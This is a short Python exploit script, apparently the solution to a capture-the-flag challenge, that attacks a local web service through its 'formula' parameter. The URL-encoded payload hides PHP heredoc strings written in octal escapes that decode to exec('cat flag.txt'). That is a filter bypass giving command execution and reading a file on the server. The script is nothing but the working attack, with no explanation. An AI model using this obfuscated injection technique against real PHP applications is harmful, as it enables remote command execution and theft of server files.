from requests import *
payload="(%3C%3C%3C_%0A%5c145%5c170%5c145%5c143%0A_)(%3C%3C%3C_%0A%5c143%5c141%5c164%5c40%5c146%5c154%5c141%5c147%5c56%5c164%5c170%5c164%0A_)"
url=f"http://localhost:8888/?formula={payload}"
r=get(url)
print(r.text)
